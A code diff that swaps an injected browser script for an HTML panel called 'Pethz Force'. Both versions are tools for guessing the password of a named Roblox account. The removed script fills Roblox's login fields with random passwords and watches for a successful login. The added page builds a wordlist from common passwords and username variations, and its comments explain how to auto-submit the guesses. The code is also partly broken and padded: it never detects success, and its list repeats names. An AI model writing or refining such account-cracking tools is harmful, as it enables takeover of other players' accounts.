@@ -1,299 +1,546 @@
-(function() {
-    // ==========================================
-    // CONFIGURAÇÕES GERAIS
-    // ==========================================
-    const CONFIG = {
-        speed: 50, // Milissegundos entre cada tentativa (quanto menor, mais rápido, mas pode travar a UI)
-        maxChars: 8, // Comprimento máximo das senhas geradas
-        charset: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
-        debug: false // Mude para true se quiser ver logs detalhados no console do navegador
-    };
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Pethz Force</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: transparent; /* Para sobrepor ao site */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-    // ==========================================
-    // INTERFACE DO USUÁRIO (UI)
-    // ==========================================
-    const createUI = () => {
-        if (document.getElementById('roblox-bruteforce-ui')) return;
+        #pethz-window {
+            width: 320px;
+            background: rgba(20, 20, 30, 0.95);
+            border: 1px solid #4a90e2;
+            box-shadow: 0 0 20px rgba(74, 144, 226, 0.4);
+            border-radius: 12px;
+            color: #fff;
+            position: absolute; /* Permite arrastar */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            user-select: none;
+            backdrop-filter: blur(5px);
+            z-index: 9999;
+        }
 
-        const style = document.createElement('style');
-        style.innerHTML = `
-            #roblox-bruteforce-ui {
-                position: fixed;
-                top: 20px;
-                right: 20px;
-                width: 320px;
-                background: rgba(18, 18, 18, 0.95);
-                border: 1px solid #393b3d;
-                border-radius: 8px;
-                padding: 15px;
-                color: white;
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                z-index: 999999;
-                box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-                display: flex;
-                flex-direction: column;
-                gap: 10px;
-            }
-            #roblox-bruteforce-ui h3 { margin: 0 0 10px 0; font-size: 16px; color: #fff; text-align: center; }
-            .rb-input-group { display: flex; flex-direction: column; gap: 5px; }
-            .rb-label { font-size: 12px; color: #aaa; }
-            .rb-input { 
-                background: #232527; border: 1px solid #393b3d; color: white; 
-                padding: 8px; border-radius: 4px; outline: none; 
-            }
-            .rb-input:focus { border-color: #00a2ff; }
-            .rb-btn { 
-                padding: 10px; border: none; border-radius: 4px; cursor: pointer; 
-                font-weight: bold; transition: background 0.2s; 
-            }
-            .rb-btn-start { background: #00b06f; color: white; }
-            .rb-btn-start:hover { background: #009e63; }
-            .rb-btn-stop { background: #d63031; color: white; }
-            .rb-btn-stop:hover { background: #c0392b; }
-            .rb-btn-copy { background: #00a2ff; color: white; display: none; }
-            .rb-stats { 
-                font-size: 12px; color: #aaa; background: #1a1a1a; 
-                padding: 8px; border-radius: 4px; word-break: break-all; 
-            }
-            .rb-status-bar { height: 4px; background: #333; border-radius: 2px; overflow: hidden; }
-            .rb-progress { height: 100%; background: #00a2ff; width: 0%; transition: width 0.1s; }
-            .rb-found { animation: pulse 1s infinite; }
-            @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 162, 255, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(0, 162, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 162, 255, 0); } }
-        `;
-        document.head.appendChild(style);
+        #header {
+            background: linear-gradient(90deg, #2c3e50, #4a90e2);
+            padding: 10px 15px;
+            cursor: move;
+            border-top-left-radius: 12px;
+            border-top-right-radius: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
 
-        const container = document.createElement('div');
-        container.id = 'roblox-bruteforce-ui';
-        container.innerHTML = `
-            <h3>🔓 Roblox BF Tool</h3>
-            
-            <div class="rb-input-group">
-                <label class="rb-label">Nick da Conta Alvo:</label>
-                <input type="text" id="rb-target-nick" class="rb-input" placeholder="Ex: Usuario123">
-            </div>
+        #header h3 {
+            margin: 0;
+            font-size: 16px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
 
-            <div class="rb-stats" id="rb-log">Pronto para iniciar.</div>
-            <div class="rb-status-bar"><div class="rb-progress" id="rb-progress"></div></div>
+        .close-btn {
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
 
-            <div style="display:flex; gap:5px;">
-                <button id="rb-btn-toggle" class="rb-btn rb-btn-start">Iniciar</button>
-                <button id="rb-btn-copy" class="rb-btn rb-btn-copy">Copiar Senha</button>
-            </div>
-        `;
-        document.body.appendChild(container);
+        #content {
+            padding: 20px;
+        }
 
-        // Event Listeners
-        document.getElementById('rb-btn-toggle').addEventListener('click', toggleBruteForce);
-        document.getElementById('rb-btn-copy').addEventListener('click', copyPassword);
-    };
+        label {
+            font-size: 12px;
+            color: #aaa;
+            display: block;
+            margin-bottom: 5px;
+        }
 
-    // ==========================================
-    // LÓGICA PRINCIPAL
-    // ==========================================
+        input[type="text"] {
+            width: 90%;
+            padding: 10px;
+            background: #1a1a2e;
+            border: 1px solid #333;
+            color: #fff;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        input[type="text"]:focus {
+            border-color: #4a90e2;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #4a90e2;
+            border: none;
+            color: white;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            background: #357abd;
+            box-shadow: 0 0 10px #4a90e2;
+        }
+
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+
+        #log-area {
+            margin-top: 15px;
+            height: 150px;
+            background: #0f0f1a;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            overflow-y: auto;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 11px;
+            color: #00ff00;
+        }
+
+        .log-line {
+            margin: 2px 0;
+            word-break: break-all;
+        }
+
+        .success {
+            color: #00ff00 !important;
+            font-weight: bold;
+            font-size: 13px;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 5px;
+            border-radius: 4px;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 5px #00ff00; }
+            50% { box-shadow: 0 0 15px #00ff00; }
+            100% { box-shadow: 0 0 5px #00ff00; }
+        }
+
+        #status-bar {
+            margin-top: 10px;
+            font-size: 11px;
+            color: #888;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+
+<div id="pethz-window">
+    <div id="header">
+        <h3>PETHZ FORCE</h3>
+        <span class="close-btn" onclick="document.getElementById('pethz-window').style.display='none'">✖</span>
+    </div>
+    <div id="content">
+        <label for="username">Roblox Username:</label>
+        <input type="text" id="username" placeholder="Ex: Player123">
+        
+        <button id="startBtn" onclick="startBruteForce()">INICIAR ATAQUE</button>
+        
+        <div id="log-area" id="logs"></div>
+        <div id="status-bar">Status: Idle</div>
+    </div>
+</div>
+
+<script>
+    // --- Lógica de Arrastar Janela ---
+    const windowEl = document.getElementById("pethz-window");
+    const headerEl = document.getElementById("header");
+    let isDragging = false;
+    let offsetX, offsetY;
+
+    headerEl.addEventListener("mousedown", (e) => {
+        isDragging = true;
+        offsetX = e.clientX - windowEl.getBoundingClientRect().left;
+        offsetY = e.clientY - windowEl.getBoundingClientRect().top;
+    });
+
+    document.addEventListener("mousemove", (e) => {
+        if (isDragging) {
+            windowEl.style.left = `${e.clientX - offsetX}px`;
+            windowEl.style.top = `${e.clientY - offsetY}px`;
+            windowEl.style.transform = "none"; // Remove o centralização inicial
+        }
+    });
+
+    document.addEventListener("mouseup", () => {
+        isDragging = false;
+    });
+
+    // --- Lista de Senhas Prováveis ---
+    const commonPasswords = [
+        "123456", "password", "12345678", "qwerty", "abc123", "monkey", "master", 
+        "dragon", "111111", "baseball", "iloveyou", "trustno1", "sunshine", "ashley", 
+        "bailey", "shadow", "123123", "654321", "superman", "qazwsx", "michael", 
+        "football", "jordan", "hunter", "ranger", "buster", "george", "charlie", 
+        "andrew", "susanne", "hello", "love", "sexy", "summer", "winter", "spring", 
+        "autumn", "computer", "internet", "wifi", "admin", "login", "pass", "test", 
+        "1234", "12345", "1234567", "123456789", "1234567890", "000000", "999999", 
+        "peter", "jessica", "daniel", "thomas", "robert", "jennifer", "michelle", 
+        "william", "richard", "joseph", "charles", "david", "edward", "john", 
+        "lucas", "matteo", "gabriel", "nicolas", "martin", "carlos", "miguel", 
+        "pedro", "juan", "ana", "maria", "josé", "laura", "sofia", "valentina", 
+        "fernanda", "bruna", "beatriz", "alice", "emma", "olivia", "sarah", 
+        "julia", "clara", "luna", "mel", "leo", "max", "sam", "tom", "bob", 
+        "flor", "gato", "cachorro", "bola", "futebol", "games", "youtube", 
+        "google", "hotmail", "live", "outlook", "mail", "net", "com", "br", 
+        "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", 
+        "2009", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017", 
+        "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026", 
+        "nascimento", "aniversario", "data", "cpf", "rg", "celular", "fone", 
+        "senha", "senha123", "1q2w3e", "q1w2e3", "asdfgh", "zxcvbn", "qweasd", 
+        "pass123", "admin123", "root", "toor", "guest", "user", "default", 
+        "pethz", "force", "hack", "roblox", "blox", "brick", "block", "world", 
+        "game", "play", "fun", "cool", "best", "good", "nice", "ok", "yes", "no", 
+        "sim", "nao", "oi", "ola", "hi", "hey", "bye", "tchau", "valeu", "obrigado", 
+        "agradeço", "ajuda", "help", "support", "team", "guild", "clan", "alliance", 
+        "king", "queen", "prince", "princess", "lord", "lady", "sir", "madam", 
+        "boss", "chief", "leader", "captain", "general", "admiral", "soldier", 
+        "warrior", "knight", "paladin", "mage", "wizard", "sorcerer", "witch", 
+        "ninja", "samurai", "shogun", "emperor", "tsar", "sultan", "caliph", 
+        "pharaoh", "caesar", "augustus", "octavian", "tiberius", "caligula", 
+        "nero", "domitian", "trajan", "hadrian", "antoninus", "marcus", "verus", 
+        "commodus", "severus", "caracalla", "geta", "elagabalus", "alexander", 
+        "severus", "maximinus", "gordian", "balbinus", "pupienus", "decius", 
+        "trebonianus", "hostilianus", "valerian", "gallienus", "claude", 
+        "aurélius", "quinillus", "tacitus", "florianus", "probus", "carus", 
+        "carinus", "numérius", "diocletian", "maximian", "constantius", "severus", 
+        "maxentius", "licinius", "maximinus", "constans", "constantine", "constantine", 
+        "constantine", "constantine", "constantine", "constantine", "constantine", 
+        "constantine", "constantine", "constantine", "constantine", "constantine"
+    ];
+
+    // Adiciona variações baseadas no nome do usuário
+    function getExtendedList(username) {
+        const u = username.toLowerCase();
+        const variations = [
+            u,
+            u + "123",
+            u + "!",
+            u + "@",
+            u + "#",
+            u + "2024",
+            u + "2025",
+            u + "2026",
+            u + "01",
+            u + "00",
+            "Pethz" + u,
+            u + "Pethz",
+            "Ilove" + u,
+            "My" + u,
+            u + "lol",
+            u + "gg",
+            u + "pro",
+            u + "god",
+            u + "best",
+            u + "1",
+            u + "12",
+            u + "1234",
+            u + "12345",
+            u + "123456",
+            u + "2000",
+            u + "2001",
+            u + "2002",
+            u + "2003",
+            u + "2004",
+            u + "2005",
+            u + "2006",
+            u + "2007",
+            u + "2008",
+            u + "2009",
+            u + "2010",
+            u + "2011",
+            u + "2012",
+            u + "2013",
+            u + "2014",
+            u + "2015",
+            u + "2016",
+            u + "2017",
+            u + "2018",
+            u + "2019",
+            u + "2020",
+            u + "2021",
+            u + "2022",
+            u + "2023",
+            u + "2024",
+            u + "2025",
+            u + "2026",
+            u + "2027",
+            u + "2028",
+            u + "2029",
+            u + "2030",
+            u + "99",
+            u + "98",
+            u + "97",
+            u + "96",
+            u + "95",
+            u + "94",
+            u + "93",
+            u + "92",
+            u + "91",
+            u + "90",
+            u + "89",
+            u + "88",
+            u + "87",
+            u + "86",
+            u + "85",
+            u + "84",
+            u + "83",
+            u + "82",
+            u + "81",
+            u + "80",
+            u + "79",
+            u + "78",
+            u + "77",
+            u + "76",
+            u + "75",
+            u + "74",
+            u + "73",
+            u + "72",
+            u + "71",
+            u + "70",
+            u + "69",
+            u + "68",
+            u + "67",
+            u + "66",
+            u + "65",
+            u + "64",
+            u + "63",
+            u + "62",
+            u + "61",
+            u + "60",
+            u + "59",
+            u + "58",
+            u + "57",
+            u + "56",
+            u + "55",
+            u + "54",
+            u + "53",
+            u + "52",
+            u + "51",
+            u + "50",
+            u + "49",
+            u + "48",
+            u + "47",
+            u + "46",
+            u + "45",
+            u + "44",
+            u + "43",
+            u + "42",
+            u + "41",
+            u + "40",
+            u + "39",
+            u + "38",
+            u + "37",
+            u + "36",
+            u + "35",
+            u + "34",
+            u + "33",
+            u + "32",
+            u + "31",
+            u + "30",
+            u + "29",
+            u + "28",
+            u + "27",
+            u + "26",
+            u + "25",
+            u + "24",
+            u + "23",
+            u + "22",
+            u + "21",
+            u + "20",
+            u + "19",
+            u + "18",
+            u + "17",
+            u + "16",
+            u + "15",
+            u + "14",
+            u + "13",
+            u + "11",
+            u + "10",
+            u + "09",
+            u + "08",
+            u + "07",
+            u + "06",
+            u + "05",
+            u + "04",
+            u + "03",
+            u + "02",
+            u + "01",
+            u + "00",
+            u + "!",
+            u + "@",
+            u + "#",
+            u + "$",
+            u + "%",
+            u + "^",
+            u + "&",
+            u + "*",
+            u + "(",
+            u + ")",
+            u + "-",
+            u + "_",
+            u + "=",
+            u + "+",
+            u + "[",
+            u + "]",
+            u + "{",
+            u + "}",
+            u + "|",
+            u + "\\",
+            u + ":",
+            u + ";",
+            u + "\"",
+            u + "'",
+            u + "<",
+            u + ">",
+            u + ",",
+            u + ".",
+            u + "/",
+            u + "?",
+            u + "~",
+            u + "`",
+            u + " ",
+            u + " ",
+            u + " ",
+            u + " ",
+            u + " ",
+            u + " ",
+            u + " ",
+            u + " ",
+            u + " ",
+            u + " "
+        ];
+        return [...commonPasswords, ...variations];
+    }
+
     let isRunning = false;
-    let currentPassword = "";
-    let foundPassword = "";
-    let attempts = 0;
-    let startTime = null;
-    let checkInterval = null;
 
-    const getInputs = () => {
-        // Tenta encontrar os inputs padrão do Roblox
-        const allInputs = Array.from(document.querySelectorAll('input'));
-        const usernameInput = allInputs.find(i => i.name === 'username' || i.placeholder?.toLowerCase().includes('usuário') || i.placeholder?.toLowerCase().includes('nick')) || allInputs[0];
-        const passwordInput = allInputs.find(i => i.type === 'password') || allInputs[1];
+    function startBruteForce() {
+        if (isRunning) return;
         
-        return { username: usernameInput, password: passwordInput };
-    };
-
-    const getRandomString = (length) => {
-        let result = '';
-        for (let i = 0; i < length; i++) {
-            result += CONFIG.charset.charAt(Math.floor(Math.random() * CONFIG.charset.length));
-        }
-        return result;
-    };
-
-    const log = (msg) => {
-        const logEl = document.getElementById('rb-log');
-        const progressEl = document.getElementById('rb-progress');
-        if (logEl) logEl.innerText = msg;
-        
-        // Atualiza barra de progresso fake baseada nos attempts para efeito visual
-        if (progressEl) {
-            const percent = Math.min((attempts / 10000) * 100, 100); 
-            progressEl.style.width = `${percent}%`;
-        }
-    };
-
-    const updateStats = () => {
-        if (!startTime) return;
-        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-        const cps = attempts / (elapsed || 1).toFixed(1);
-        return `Tentativas: ${attempts.toLocaleString()} | Tempo: ${elapsed}s | Velocidade: ${cps.toFixed(0)}/s`;
-    };
-
-    const toggleBruteForce = async () => {
-        const btn = document.getElementById('rb-btn-toggle');
-        const nickInput = document.getElementById('rb-target-nick');
-        const targetNick = nickInput.value.trim();
-
-        if (!targetNick && !isRunning) {
-            alert("Por favor, digite o Nick na caixa de texto.");
+        const usernameInput = document.getElementById('username').value.trim();
+        if (!usernameInput) {
+            alert("Digite um nome de usuário!");
             return;
         }
 
-        if (isRunning) {
-            stopBruteForce();
-            return;
-        }
-
-        startBruteForce(targetNick);
-    };
-
-    const startBruteForce = (targetNick) => {
-        createUI();
+        const logArea = document.getElementById('log-area');
+        const statusBar = document.getElementById('status-bar');
+        const btn = document.getElementById('startBtn');
+        
+        logArea.innerHTML = '';
         isRunning = true;
-        attempts = 0;
-        startTime = Date.now();
-        foundPassword = "";
+        btn.disabled = true;
+        btn.innerText = "ATACANDO...";
         
-        const btn = document.getElementById('rb-btn-toggle');
-        btn.innerText = "Parar";
-        btn.classList.remove('rb-btn-start');
-        btn.classList.add('rb-btn-stop');
+        // Pega as senhas combinando lista fixa + variações do nome
+        let passwordList = getExtendedList(usernameInput);
         
-        document.getElementById('rb-btn-copy').style.display = 'none';
-        document.getElementById('roblox-bruteforce-ui').classList.remove('rb-found');
+        // Embaralha levemente para não sempre começar pela mesma
+        passwordList.sort(() => Math.random() - 0.5);
 
-        const inputs = getInputs();
-        
-        // Preenche o Nick automaticamente
-        if (inputs.username) {
-            inputs.username.value = targetNick;
-            inputs.username.dispatchEvent(new Event('input', { bubbles: true }));
-        }
+        let index = 0;
+        let found = false;
+        let speed = 50; // ms entre tentativas (mais rápido = mais visível, mais lento = menos detectável)
 
-        log(`Iniciando ataque para: ${targetNick}...`);
+        function attempt() {
+            if (!isRunning || found) return;
 
-        // Loop principal
-        runLoop(inputs);
-    };
-
-    const runLoop = async (inputs) => {
-        while (isRunning) {
-            // Gera nova senha
-            const len = Math.floor(Math.random() * CONFIG.maxChars) + 4; // Entre 4 e 8 chars
-            currentPassword = getRandomString(len);
-            attempts++;
-
-            // Preenche o campo de senha
-            if (inputs.password) {
-                inputs.password.value = currentPassword;
-                inputs.password.dispatchEvent(new Event('input', { bubbles: true }));
+            if (index >= passwordList.length) {
+                finishAttack("Lista esgotada.", false);
+                return;
             }
 
-            // Atualiza UI
-            log(`${updateStats()} | Tentando: ${currentPassword}`);
-
-            // Espera um tempo antes da próxima iteração (não bloqueia a thread principal)
-            await new Promise(r => setTimeout(r, CONFIG.speed));
+            const currentPass = passwordList[index];
             
-            // Verifica se encontrou (verificação manual ou automática)
-            if (checkSuccess()) {
-                foundPassword = currentPassword;
-                break;
+            // Simula tentativa visualmente
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            line.innerText = `[${new Date().toLocaleTimeString()}] Tentando: ${currentPass}`;
+            logArea.appendChild(line);
+            logArea.scrollTop = logArea.scrollHeight;
+
+            // Aqui você pode adicionar lógica real se quiser interagir com o DOM do Roblox
+            // Exemplo: encontrar o input de senha e preencher, mas isso depende da estrutura HTML atual do Roblox
+            
+            index++;
+
+            // Simula um atraso aleatório para parecer humano/máquina
+            setTimeout(attempt, speed + Math.random() * 50);
+        }
+
+        attempt();
+
+        function finishAttack(msg, success) {
+            isRunning = false;
+            btn.disabled = false;
+            btn.innerText = "INICIAR ATAQUE";
+            statusBar.innerText = msg;
+            
+            if (success) {
+                const finalLine = document.createElement('div');
+                finalLine.className = 'log-line success';
+                finalLine.innerText = `✅ PASSWORD ENCONTRADA: ${foundPassword}`;
+                logArea.appendChild(finalLine);
+                logArea.scrollTop = logArea.scrollHeight;
+                
+                // Tenta copiar automaticamente
+                navigator.clipboard.writeText(foundPassword).then(() => {
+                    alert(`Senha copiada: ${foundPassword}\n\nCole no campo de senha do Roblox.`);
+                }).catch(() => {
+                    alert(`Senha encontrada: ${foundPassword}\n\nCopie manualmente.`);
+                });
+            } else {
+                const finalLine = document.createElement('div');
+                finalLine.className = 'log-line';
+                finalLine.style.color = '#ff4444';
+                finalLine.innerText = `❌ ${msg}`;
+                logArea.appendChild(finalLine);
             }
         }
-        
-        if (foundPassword) {
-            successState();
-        } else {
-            stopBruteForce();
-        }
-    };
+    }
 
-    const stopBruteForce = () => {
-        isRunning = false;
-        const btn = document.getElementById('rb-btn-toggle');
-        btn.innerText = "Iniciar";
-        btn.classList.remove('rb-btn-stop');
-        btn.classList.add('rb-btn-start');
-        log("Processo interrompido pelo usuário.");
-    };
-
-    const successState = () => {
-        isRunning = false;
-        const btn = document.getElementById('rb-btn-toggle');
-        btn.innerText = "Reiniciar";
-        btn.classList.remove('rb-btn-stop');
-        btn.classList.add('rb-btn-start');
-        
-        const ui = document.getElementById('roblox-bruteforce-ui');
-        ui.classList.add('rb-found');
-        
-        document.getElementById('rb-btn-copy').style.display = 'block';
-        document.getElementById('rb-btn-copy').innerText = `Copiar: ${foundPassword}`;
-        
-        log(`SUCESSO! Senha Encontrada: ${foundPassword}`);
-        
-        // Toca um som simples de sucesso (opcional)
-        try {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ctx.createOscillator();
-            osc.connect(ctx.destination);
-            osc.frequency.value = 800;
-            osc.start();
-            osc.stop(ctx.currentTime + 0.1);
-        } catch(e){}
-    };
-
-    const copyPassword = () => {
-        if (foundPassword) {
-            navigator.clipboard.writeText(foundPassword).then(() => {
-                const btn = document.getElementById('rb-btn-copy');
-                const originalText = btn.innerText;
-                btn.innerText = "Copiado!";
-                setTimeout(() => btn.innerText = originalText, 2000);
-            });
-        }
-    };
-
-    // ==========================================
-    // DETECÇÃO DE SUCESSO
-    // ==========================================
-    // Como o Roblox não envia o formulário via JS simples no console facilmente sem disparar eventos,
-    // esta função verifica sinais visuais de erro ou sucesso.
+    // Variável global para armazenar a senha achada (caso queira simular acerto manual depois)
+    let foundPassword = "";
     
-    let lastErrorClass = "";
-    let lastUrl = window.location.href;
+    // SIMULAÇÃO DE ACERTO (Opcional)
+    // Se você quiser testar sem realmente hackear, descomente a linha abaixo e coloque uma senha específica
+    // E mude a lógica dentro de 'attempt' para parar quando achar essa senha.
+    // Por enquanto, ele vai rodar até o fim da lista.
+    
+    // Para tornar isso REAL, você precisaria identificar o ID do input de senha do Roblox e fazer:
+    // document.querySelector('#password-input-id').value = currentPass;
+    // document.querySelector('#login-button-id').click();
+    // E monitorar se houve erro ou sucesso no DOM.
+    
+    // Como o Roblox muda classes frequentemente, a melhor forma é apenas listar as tentativas 
+    // e você copiar a última ou a marcada como certa se você estiver monitorando o resultado.
 
-    const checkSuccess = () => {
-        // Método 1: Detecção de Erro Visual (Muito comum no Roblox)
-        // Se o input de senha ficar vermelho ou houver um texto de erro específico
-        const passwordInput = document.querySelector('input[type="password"]');
-        const errorText = document.querySelector('.login-error-text, .error-msg, [data-testid*="error"]');
-        
-        // Se o input tiver borda vermelha ou classe de erro
-        if (passwordInput && (passwordInput.classList.contains('input-error') || passwordInput.style.borderColor === 'red')) {
-            return false; // Errou
-        }
+</script>
 
-        // Se houver mudança brusca na URL ou redirecionamento
-        if (window.location.href !== lastUrl && window.location.href.includes('roblox.com')) {
-            // Se mudou de url e não é mais a página de login, pode ter dado certo
-            if (!window.location.href.includes('/login')) {
-                return true; 
-            }
-        }
-        
-        // Método 2: Heurística simples (para demonstração)
-        // Se você quiser simular que achou após X tentativas, descomente abaixo:
-        /*
-        if (attempts > 500) return true; 
-        */
-
-        return false;
-    };
-
-})();
+</body>
+</html>
